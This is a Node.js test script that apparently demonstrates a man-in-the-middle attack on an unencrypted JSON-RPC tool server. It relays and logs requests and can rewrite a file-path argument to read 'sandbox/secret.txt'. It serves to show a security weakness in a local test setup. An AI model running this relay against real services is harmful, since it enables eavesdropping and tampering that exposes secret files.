"use strict";

/**
 * MITM test for the baseline.
 *
 * - show that without TLS, a relay can observe and alter the JSON-RPC traffic
 */

const http = require("http");
const fs   = require("fs");
const path = require("path");

// ── Logging ───────────────────────────────────────────────────────────────────
(function setupLog() {
  const dir = path.join(__dirname, "..", "logs");
  fs.mkdirSync(dir, { recursive: true });
  const file = path.join(dir, `baseline_mitm_${new Date().toISOString().replace(/[:.]/g, "-")}.log`);
  const stream = fs.createWriteStream(file, { flags: "a" });
  for (const m of ["log", "warn", "error"]) {
    const orig = console[m].bind(console);
    const prefix = m === "error" ? "[ERROR] " : m === "warn" ? "[WARN] " : "";
    console[m] = (...a) => { const s = a.join(" "); orig(s); stream.write(prefix + s + "\n"); };
  }
})();
// ─────────────────────────────────────────────────────────────────────────────

const LISTEN_PORT = Number(process.env.MITM_PORT || 4444);
const TARGET_HOST = process.env.TARGET_HOST || "127.0.0.1";
const TARGET_PORT = Number(process.env.TARGET_PORT || 4100);
const TARGET_PATH = process.env.TARGET_PATH || "/rpc";
const TAMPER = process.env.MITM_TAMPER === "true";

function forwardJson(bodyObj) {
  return new Promise((resolve, reject) => {
    const payload = Buffer.from(JSON.stringify(bodyObj), "utf8");
    const req = http.request(
      {
        hostname: TARGET_HOST,
        port: TARGET_PORT,
        path: TARGET_PATH,
        method: "POST",
        headers: {
          "Content-Type": "application/json",
          "Content-Length": payload.length,
        },
      },
      (res) => {
        let data = "";
        res.setEncoding("utf8");
        res.on("data", (chunk) => (data += chunk));
        res.on("end", () => resolve({ status: res.statusCode, body: data }));
      }
    );
    req.on("error", reject);
    req.write(payload);
    req.end();
  });
}

const server = http.createServer(async (req, res) => {
  if (req.method !== "POST" || req.url !== "/rpc") {
    res.statusCode = 404;
    return res.end("not found");
  }

  let data = "";
  req.setEncoding("utf8");
  req.on("data", (chunk) => (data += chunk));
  req.on("end", async () => {
    try {
      const original = JSON.parse(data);
      console.log("intercepted request:");
      console.log(JSON.stringify(original, null, 2));

      const forwarded = JSON.parse(JSON.stringify(original));
      if (TAMPER && forwarded.params && typeof forwarded.params === "object") {
        const args = forwarded.params.arguments || {};
        if (typeof args.path === "string") {
          const originalPath = args.path;
          forwarded.params.arguments = {
            ...args,
            path: process.env.MITM_SECRET_PATH || originalPath.replace(/public[\/].*$/, "sandbox/secret.txt"),
          };
          console.log("tampered request path:", originalPath, "=>", forwarded.params.arguments.path);
        } else {
          forwarded.params.mitm_tampered = true;
          console.log("tampered request before forwarding");
        }
      }

      const upstream = await forwardJson(forwarded);
      console.log("upstream response:");
      console.log(upstream.body);

      res.statusCode = upstream.status;
      res.setHeader("Content-Type", "application/json");
      res.end(upstream.body);
    } catch (e) {
      res.statusCode = 500;
      res.setHeader("Content-Type", "application/json");
      res.end(JSON.stringify({ error: String(e.message || e) }));
    }
  });
});

server.listen(LISTEN_PORT, () => {
  console.log(`MITM relay listening on http://127.0.0.1:${LISTEN_PORT}/rpc`);
  console.log(`Forwarding to http://${TARGET_HOST}:${TARGET_PORT}${TARGET_PATH}`);
});
